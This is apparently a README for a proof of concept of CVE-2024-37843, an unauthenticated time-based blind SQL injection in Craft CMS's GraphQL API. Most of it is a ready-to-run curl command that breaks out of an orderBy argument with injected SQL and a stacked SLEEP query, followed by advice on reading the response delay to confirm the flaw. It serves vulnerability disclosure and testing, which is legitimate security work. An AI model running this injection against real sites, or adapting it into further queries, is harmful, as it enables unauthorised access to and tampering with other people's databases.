# CVE-2024-37843-POC
POC for CVE-2024-37843. Craft CMS time-based blind SQLi

## Details available in [blog](https://blog.smithsecurity.biz/craft-cms-unauthenticated-sqli-via-graphql) 

## POC

```
curl -X POST '<URL>/api/' -H 'Content-Type:application/json' -d '{"query":"query  IntrospectionQuery  {assets(orderBy: \"`assets`.`volumeId` -- \\\\` \\n \\n LIMIT 5) AS `subquery`\\nINNER JOIN `assets` `assets` ON `assets`.`id` = `subquery`.`elementsId`\\nINNER JOIN `volumefolders` `volumeFolders` ON `volumeFolders`.`id` = `assets`.`folderId`\\nINNER JOIN `elements` `elements` ON `elements`.`id` = `subquery`.`elementsId`\\nINNER JOIN `elements_sites` `elements_sites` ON `elements_sites`.`id` = `subquery`.`elementsSitesId`\\nINNER JOIN `content` `content` ON `content`.`id` = `subquery`.`contentId`\\nORDER BY `assets`.`volumeId`; SELECT SLEEP(10) ; --\", limit: 5){filename}}"}'
```

You can adjust the SLEEP(10) to your needs but if the response to this curl request is >10 the API is vulnerable.
